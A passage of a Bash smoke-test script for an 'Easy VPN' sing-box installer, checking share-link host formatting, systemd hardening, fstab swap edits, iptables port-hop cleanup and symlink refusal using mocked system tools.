  [[ "$(normalize_server_address "[2400:8902::1]")" == "2400:8902::1" ]] || exit 2
  [[ "$(format_uri_host "2400:8902::1")" == "[2400:8902::1]" ]] || exit 3
  [[ "$(format_uri_host "[2400:8902::1]")" == "[2400:8902::1]" ]] || exit 4
  [[ "$(format_uri_host "192.0.2.10")" == "192.0.2.10" ]] || exit 5
  [[ "$(format_uri_host "vpn.example.com")" == "vpn.example.com" ]] || exit 6
' _ "$ROOT" || fail "IPv6 URI host formatter regression"
grep -Fq 'vless_link="vless://${uuid}@${uri_host}:${port}' "$ROOT/modules/protocol.sh" || fail "VLESS share link bypasses URI host formatter"
grep -Fq 'hy2_link="hysteria2://${password}@${uri_host}:${port}' "$ROOT/modules/protocol.sh" || fail "Hysteria share link bypasses URI host formatter"
grep -Fq 'tuic_link="tuic://${uuid}:${password}@${uri_host}:${port}' "$ROOT/modules/protocol.sh" || fail "TUIC share link bypasses URI host formatter"

# 26. Port-hopping help text must describe range-based UFW/firewalld behavior, not per-port rules.
grep -Fq 'UFW/firewalld 将按整个 UDP 端口段添加一条放行规则' "$ROOT/modules/protocol.sh" || fail "port-hop explanation is stale"
! grep -Fq '每个 UDP 端口各加一条放行规则' "$ROOT/modules/protocol.sh" || fail "legacy per-port firewall explanation remains"

# 27. Node-info submenu handles its own return prompt; main menu must not add a second read.
grep -Fq '4) show_protocol_node_info_menu || true ;;' "$ROOT/modules/protocol.sh" || fail "node-info menu still has an extra outer wait"
! grep -Fq '4) show_protocol_node_info_menu; read -rp "按回车继续..."' "$ROOT/modules/protocol.sh" || fail "double-enter interaction regression"

# 28. Hardened service unit limits are portable, include a writable state directory, and won't block optional hopping.
grep -Fq 'chmod 0755 "$LOCAL_ROOT" "$LOCAL_MODULES" "$LOCAL_LIB"' "$ROOT/install.sh" || fail "install tree is not traversable with secure umask"
grep -Fq 'chmod 0755 "${EASY_VPN_ROOT}" "${EASY_VPN_ROOT}/bin"' "$ROOT/modules/protocol.sh" || fail "sing-box executable path is not traversable by service user"
grep -Fq 'ReadWritePaths=/var/lib/easy-vpn' "$ROOT/modules/protocol.sh" || fail "sandbox blocks writable service state directory"
grep -Fq 'WorkingDirectory=/var/lib/easy-vpn' "$ROOT/modules/protocol.sh" || fail "sing-box service working directory missing"
[[ $(grep -Fc 'StartLimitBurst=30' "$ROOT/modules/protocol.sh") -ge 2 ]] || fail "service start limit not raised in both templates"
[[ $(grep -Fc 'RestartSec=5s' "$ROOT/modules/protocol.sh") -ge 2 ]] || fail "service restart delay not consistent"
! grep -Fq 'LimitNOFILE=1048576' "$ROOT/modules/protocol.sh" || fail "nonportable huge NOFILE limit remains"
! grep -Fq 'check_upgrade_resources()' "$ROOT/lib/common.sh" || fail "unused generic system-update logic remains in protocol-only library"

# 29. Swap fstab add/remove keeps a first-write backup and preserves unrelated entries.
FSTAB_TEST_ROOT="$regression_test/fstab-atomic"
mkdir -p "$FSTAB_TEST_ROOT/etc" "$FSTAB_TEST_ROOT/state" "$FSTAB_TEST_ROOT/backups"
printf '# original fstab\nUUID=test / ext4 defaults 0 1\n' > "$FSTAB_TEST_ROOT/etc/fstab"
EASY_VPN_ROOT="$FSTAB_TEST_ROOT/root" EASY_VPN_ETC="$FSTAB_TEST_ROOT/etc" EASY_VPN_STATE="$FSTAB_TEST_ROOT/state" EASY_VPN_BACKUPS="$FSTAB_TEST_ROOT/backups" EASY_VPN_LOG="$FSTAB_TEST_ROOT/log" bash -c '
  source "$1/lib/common.sh"
  append_managed_swap_fstab_entry /var/lib/easy-vpn/swapfile "$2"
  grep -Fq "/var/lib/easy-vpn/swapfile none swap sw 0 0" "$2" || exit 1
  [[ -f "$EASY_VPN_BACKUPS/managed_swap_fstab/original" ]] || exit 2
  cmp -s "$EASY_VPN_BACKUPS/managed_swap_fstab/original" <(printf "# original fstab\nUUID=test / ext4 defaults 0 1\n") || exit 3
  remove_managed_swap_fstab_entry /var/lib/easy-vpn/swapfile "$2"
  ! grep -Fq "/var/lib/easy-vpn/swapfile none swap" "$2" || exit 3
  grep -Fq "UUID=test / ext4 defaults 0 1" "$2" || exit 4
' _ "$ROOT" "$FSTAB_TEST_ROOT/etc/fstab" || fail "atomic fstab backup/add/remove regression"

# 30. Dynamic port-hop range cleanup removes stale jumps to the owned chain before deleting it.
iptables_cleanup_test="$regression_test/iptables-chain-cleanup"
mkdir -p "$iptables_cleanup_test/root" "$iptables_cleanup_test/etc/port-hop" "$iptables_cleanup_test/state" "$iptables_cleanup_test/backups" "$iptables_cleanup_test/bin"
cat > "$iptables_cleanup_test/bin/iptables" <<'MOCK_IPT_CLEAN'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "$IPT_CLEAN_LOG"
case "$*" in
  '-t nat -S PREROUTING') printf '%s\n' "-A PREROUTING -p udp --dport 21000:21100 -j EASY_VPN_HOP_HY2"; exit 0 ;;
  '-t nat -D PREROUTING -p udp --dport 21000:21100 -j EASY_VPN_HOP_HY2') exit 0 ;;
  '-t nat -L EASY_VPN_HOP_HY2 -n') exit 0 ;;
  '-t nat -F EASY_VPN_HOP_HY2') exit 0 ;;
  '-t nat -X EASY_VPN_HOP_HY2') exit 0 ;;
  *) exit 1 ;;
esac
MOCK_IPT_CLEAN
chmod 755 "$iptables_cleanup_test/bin/iptables"
PATH="$iptables_cleanup_test/bin:$PATH" IPT_CLEAN_LOG="$iptables_cleanup_test/ipt.log" EASY_VPN_ROOT="$iptables_cleanup_test/root" EASY_VPN_ETC="$iptables_cleanup_test/etc" EASY_VPN_STATE="$iptables_cleanup_test/state" EASY_VPN_BACKUPS="$iptables_cleanup_test/backups" EASY_VPN_LOG="$iptables_cleanup_test/log" bash -c '
  source "$1/lib/common.sh"; source "$1/modules/protocol.sh"
  command_exists() { [[ "$1" == nft ]] && return 1; command -v "$1" >/dev/null 2>&1; }
  state_set "$(protocol_hop_state_key hy2)" 21000-21100
  state_set "$(protocol_hop_backend_state_key hy2)" iptables
  state_set "$(protocol_hop_listen_state_key hy2)" 443
  mkdir -p "$EASY_VPN_ETC/port-hop"
  printf "format=easy-vpn-port-hop-v1\nname=hy2\nrange=21000-21100\nlisten_port=443\n" > "$EASY_VPN_ETC/port-hop/hy2.iptables"
  mark_owned "$EASY_VPN_ETC/port-hop/hy2.iptables"
  remove_port_hopping hy2
' _ "$ROOT" || fail "iptables chain cleanup failed"
grep -Fq -- '-t nat -D PREROUTING -p udp --dport 21000:21100 -j EASY_VPN_HOP_HY2' "$iptables_cleanup_test/ipt.log" || fail "expected PREROUTING chain jump wasn't removed"
grep -Fq -- '-t nat -X EASY_VPN_HOP_HY2' "$iptables_cleanup_test/ipt.log" || fail "owned chain wasn't deleted after detaching jumps"

# 31. Protocol-only shared library must not re-export unrelated OS/system-upgrade helpers.
for obsolete in check_os confirm_safety_prompt check_upgrade_resources sys_full_upgrade sys_security_upgrade; do
  ! grep -q "^${obsolete}()" "$ROOT/lib/common.sh" || fail "obsolete general-purpose helper remains: $obsolete"
done


# 32. An existing owned but inactive swap file must not silently report success; it should restore persistence and activate.
SWAP_RECOVERY_ROOT="$regression_test/swap-recovery"
mkdir -p "$SWAP_RECOVERY_ROOT/etc" "$SWAP_RECOVERY_ROOT/state" "$SWAP_RECOVERY_ROOT/backups" "$SWAP_RECOVERY_ROOT/var/lib/easy-vpn" "$SWAP_RECOVERY_ROOT/bin"
printf '# fstab\n' > "$SWAP_RECOVERY_ROOT/etc/fstab"
: > "$SWAP_RECOVERY_ROOT/var/lib/easy-vpn/swapfile"
cat > "$SWAP_RECOVERY_ROOT/bin/findmnt" <<'MOCK_FINDMNT_SWAP'
#!/usr/bin/env bash
printf 'ext4\n'
MOCK_FINDMNT_SWAP
cat > "$SWAP_RECOVERY_ROOT/bin/swapon" <<'MOCK_SWAPON_SWAP'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "$SWAPON_LOG"
exit 0
MOCK_SWAPON_SWAP
chmod 755 "$SWAP_RECOVERY_ROOT/bin/findmnt" "$SWAP_RECOVERY_ROOT/bin/swapon"
PATH="$SWAP_RECOVERY_ROOT/bin:$PATH" SWAPON_LOG="$SWAP_RECOVERY_ROOT/swapon.log" EASY_VPN_ROOT="$SWAP_RECOVERY_ROOT/root" EASY_VPN_ETC="$SWAP_RECOVERY_ROOT/etc" EASY_VPN_STATE="$SWAP_RECOVERY_ROOT/state" EASY_VPN_BACKUPS="$SWAP_RECOVERY_ROOT/backups" EASY_VPN_LOG="$SWAP_RECOVERY_ROOT/log" EASY_VPN_SWAP_PATH="$SWAP_RECOVERY_ROOT/var/lib/easy-vpn/swapfile" EASY_VPN_FSTAB_PATH="$SWAP_RECOVERY_ROOT/etc/fstab" bash -c '
  source "$1/lib/common.sh"
  current_swap_mb() { echo 128; }
  get_root_free_mb() { echo 4096; }
  managed_swap_is_active() { return 1; }
  mark_owned "$EASY_VPN_SWAP_PATH"
  swapon() { printf "%s\\n" "$*" >> "$SWAPON_LOG"; return 0; }
  ensure_managed_swap 256
  grep -Fq "$EASY_VPN_SWAP_PATH none swap sw 0 0" "$EASY_VPN_FSTAB_PATH"
  grep -Fq "$EASY_VPN_SWAP_PATH" "$SWAPON_LOG"
' _ "$ROOT" || fail "existing owned inactive swap recovery test failed"

# 33. If the fstab backup cannot be trusted/created, refuse the edit and keep original bytes unchanged.
FSTAB_FAIL_ROOT="$regression_test/fstab-backup-fail"
mkdir -p "$FSTAB_FAIL_ROOT/etc" "$FSTAB_FAIL_ROOT/state" "$FSTAB_FAIL_ROOT/backups"
printf 'ORIGINAL-FSTAB\n' > "$FSTAB_FAIL_ROOT/etc/fstab"
mkdir -p "$FSTAB_FAIL_ROOT/backups/managed_swap_fstab"
: > "$FSTAB_FAIL_ROOT/backups/managed_swap_fstab/original"
# The backup is invalid because its one-time marker is absent; the helper must refuse to edit.
cp "$FSTAB_FAIL_ROOT/etc/fstab" "$FSTAB_FAIL_ROOT/expected"
EASY_VPN_ROOT="$FSTAB_FAIL_ROOT/root" EASY_VPN_ETC="$FSTAB_FAIL_ROOT/etc" EASY_VPN_STATE="$FSTAB_FAIL_ROOT/state" EASY_VPN_BACKUPS="$FSTAB_FAIL_ROOT/backups" EASY_VPN_LOG="$FSTAB_FAIL_ROOT/log" bash -c '
  source "$1/lib/common.sh"
  if append_managed_swap_fstab_entry /var/lib/easy-vpn/swapfile "$2"; then exit 1; fi
  cmp -s "$2" "$3"
' _ "$ROOT" "$FSTAB_FAIL_ROOT/etc/fstab" "$FSTAB_FAIL_ROOT/expected" || fail "fstab edit proceeded with invalid backup state"

# 34. Listener health must match the systemd MainPID, not an unrelated process occupying the same port.
LISTENER_TEST_ROOT="$regression_test/listener-pid"
mkdir -p "$LISTENER_TEST_ROOT/root" "$LISTENER_TEST_ROOT/etc/sing-box" "$LISTENER_TEST_ROOT/state" "$LISTENER_TEST_ROOT/backups" "$LISTENER_TEST_ROOT/bin"
printf '{"inbounds":[{"tag":"vless-in","type":"vless","listen_port":443}]}' > "$LISTENER_TEST_ROOT/etc/sing-box/config.json"
cat > "$LISTENER_TEST_ROOT/bin/ss" <<'MOCK_SS_LISTENER'
#!/usr/bin/env bash
printf '%s\n' "$SS_MOCK_OUTPUT"
MOCK_SS_LISTENER
chmod 755 "$LISTENER_TEST_ROOT/bin/ss"
PATH="$LISTENER_TEST_ROOT/bin:$PATH" EASY_VPN_ROOT="$LISTENER_TEST_ROOT/root" EASY_VPN_ETC="$LISTENER_TEST_ROOT/etc" EASY_VPN_CONF_DIR="$LISTENER_TEST_ROOT/etc/sing-box" EASY_VPN_STATE="$LISTENER_TEST_ROOT/state" EASY_VPN_BACKUPS="$LISTENER_TEST_ROOT/backups" EASY_VPN_LOG="$LISTENER_TEST_ROOT/log" SS_MOCK_OUTPUT='tcp LISTEN 0 128 0.0.0.0:443 0.0.0.0:* users:(("nginx",pid=2222,fd=7))' bash -c '
  source "$1/lib/common.sh"; source "$1/modules/protocol.sh"
  command_exists() { [[ "$1" == ss ]] && return 0; command -v "$1" >/dev/null 2>&1; }
  systemctl() { [[ "$*" == "show -p MainPID easy-vpn-sing-box.service" ]] && { echo MainPID=1111; return 0; }; return 1; }
  if protocol_listener_is_up vless; then exit 1; fi
  SS_MOCK_OUTPUT="tcp LISTEN 0 128 0.0.0.0:443 0.0.0.0:* users:((\"sing-box\",pid=1111,fd=7))"
  export SS_MOCK_OUTPUT
  protocol_listener_is_up vless
' _ "$ROOT" || fail "service listener ownership test failed"

# 35. Project/kernel versions are accepted only as stable X.Y.Z to prevent suffixes or four-component versions being misordered.
awk '/^easy_vpn_version_gt\(\) \{$/{capture=1} capture{print} capture && /^}/{exit}' "$ROOT/install.sh" > "$regression_test/version-compare-install.sh"
bash -c '
  source "$1"
  easy_vpn_version_gt 1.0.12 1.0.11
  if easy_vpn_version_gt 1.0.12-rc1 1.0.11; then exit 1; fi
  if easy_vpn_version_gt 1.0.12.1 1.0.11; then exit 2; fi
' _ "$regression_test/version-compare-install.sh" || fail "installer version comparator accepted unsupported version format"
awk '/^protocol_version_gt\(\) \{$/{capture=1} capture{print} capture && /^}/{exit}' "$ROOT/modules/protocol.sh" > "$regression_test/version-compare-protocol.sh"
bash -c '
  source "$1"
  protocol_version_gt 1.0.12 1.0.11
  if protocol_version_gt 1.0.12-rc1 1.0.11; then exit 1; fi
  if protocol_version_gt 1.0.12.1 1.0.11; then exit 2; fi
' _ "$regression_test/version-compare-protocol.sh" || fail "protocol version comparator accepted unsupported version format"

# 36. fstab symlinks are rejected rather than followed or replaced.
FSTAB_LINK_ROOT="$regression_test/fstab-symlink"
mkdir -p "$FSTAB_LINK_ROOT/etc" "$FSTAB_LINK_ROOT/state" "$FSTAB_LINK_ROOT/backups"
printf 'SAFE-ORIGINAL\n' > "$FSTAB_LINK_ROOT/etc/real-fstab"
ln -s "$FSTAB_LINK_ROOT/etc/real-fstab" "$FSTAB_LINK_ROOT/etc/fstab"
EASY_VPN_ROOT="$FSTAB_LINK_ROOT/root" EASY_VPN_ETC="$FSTAB_LINK_ROOT/etc" EASY_VPN_STATE="$FSTAB_LINK_ROOT/state" EASY_VPN_BACKUPS="$FSTAB_LINK_ROOT/backups" EASY_VPN_LOG="$FSTAB_LINK_ROOT/log" bash -c '
  source "$1/lib/common.sh"
  if append_managed_swap_fstab_entry /var/lib/easy-vpn/swapfile "$2" 2>/dev/null; then exit 1; fi
  [[ -L "$2" ]] || exit 2
  grep -Fxq SAFE-ORIGINAL "${2}.target" 2>/dev/null && exit 3 || true
  grep -Fxq SAFE-ORIGINAL "$(readlink -f "$2")"
' _ "$ROOT" "$FSTAB_LINK_ROOT/etc/fstab" || fail "fstab symlink was followed or target was modified"

# 37. Large sing-box archive+extraction needs its own space budget, while small work keeps the default.
TEMP_SPACE_ROOT="$regression_test/temp-space"
mkdir -p "$TEMP_SPACE_ROOT/bin" "$TEMP_SPACE_ROOT/work"
cat > "$TEMP_SPACE_ROOT/bin/df" <<'MOCK_DF_SPACE'
#!/usr/bin/env bash
printf 'Filesystem 1024-blocks Used Available Capacity Mounted on\n/dev/mock 1000000 0 100000 0%% /mock\n'
MOCK_DF_SPACE
chmod 755 "$TEMP_SPACE_ROOT/bin/df"
PATH="$TEMP_SPACE_ROOT/bin:$PATH" EASY_VPN_ROOT="$TEMP_SPACE_ROOT/root" EASY_VPN_TMPDIR="$TEMP_SPACE_ROOT/work" bash -c '
  source "$1/lib/common.sh"
  make_temp_dir regression-small 64 >/dev/null || exit 1
  make_temp_dir regression-leading-zero 008 >/dev/null || exit 2
  if make_temp_dir regression-large 256 >/dev/null 2>&1; then exit 3; fi
' _ "$ROOT" || fail "temporary space requirement did not stop a large download/extract task early"
grep -Fq 'make_temp_dir singbox-install 256' "$ROOT/modules/protocol.sh" || fail "sing-box install does not reserve enough temporary space"

# 38. Restore refuses symlink/directory targets instead of following or nesting backups into them.
RESTORE_TYPE_ROOT="$regression_test/restore-type"
mkdir -p "$RESTORE_TYPE_ROOT/etc" "$RESTORE_TYPE_ROOT/state" "$RESTORE_TYPE_ROOT/backups/protocol-test" "$RESTORE_TYPE_ROOT/etc/target-dir"
printf 'ORIGINAL\n' > "$RESTORE_TYPE_ROOT/backups/protocol-test/original"
touch "$RESTORE_TYPE_ROOT/backups/protocol-test/present"
EASY_VPN_ROOT="$RESTORE_TYPE_ROOT/root" EASY_VPN_ETC="$RESTORE_TYPE_ROOT/etc" EASY_VPN_STATE="$RESTORE_TYPE_ROOT/state" EASY_VPN_BACKUPS="$RESTORE_TYPE_ROOT/backups" EASY_VPN_LOG="$RESTORE_TYPE_ROOT/log" bash -c '
  source "$1/lib/common.sh"
  if restore_file_backup "$2" protocol-test 2>/dev/null; then exit 1; fi
  [[ -d "$2" ]] || exit 2
  [[ ! -e "$2/restored" ]] || exit 3
' _ "$ROOT" "$RESTORE_TYPE_ROOT/etc/target-dir" || fail "restore_file_backup accepted a directory target"

# 39. Ctrl-D at the port-hopping range prompt must cancel Hysteria 2 deployment cleanly.
HOP_EOF_ROOT="$regression_test/port-hop-eof"
mkdir -p "$HOP_EOF_ROOT/root" "$HOP_EOF_ROOT/etc" "$HOP_EOF_ROOT/state" "$HOP_EOF_ROOT/backups"
hop_eof_output=$(printf '54321\nY\n' | EASY_VPN_ROOT="$HOP_EOF_ROOT/root" EASY_VPN_ETC="$HOP_EOF_ROOT/etc" \
    EASY_VPN_STATE="$HOP_EOF_ROOT/state" EASY_VPN_BACKUPS="$HOP_EOF_ROOT/backups" EASY_VPN_LOG="$HOP_EOF_ROOT/log" \
    bash -c '
      set -Eeuo pipefail
      source "$1/lib/common.sh"; source "$1/modules/protocol.sh"
      clear() { :; }
      get_random_protocol_port() { printf "54321\n"; }
      port_in_use() { return 1; }
      state_exists() { return 1; }
      check_protocol_resources() { echo DEPLOY_CONTINUED_AFTER_EOF; return 1; }
      rc=0; deploy_hysteria2 || rc=$?
      [[ "$rc" -eq 1 ]]
    ' _ "$ROOT" 2>&1) || fail "Ctrl-D at port-hopping prompt did not return cleanly"
grep -Fq '未读取到端口范围输入' <<< "$hop_eof_output" || fail "port-hopping EOF cancellation message missing"
! grep -Fq 'DEPLOY_CONTINUED_AFTER_EOF' <<< "$hop_eof_output" || fail "Hysteria 2 deployment continued after port-hopping EOF"

# The success banner must be the final command so failed late regressions cannot print OK first.

echo 'Easy VPN smoke tests: OK'
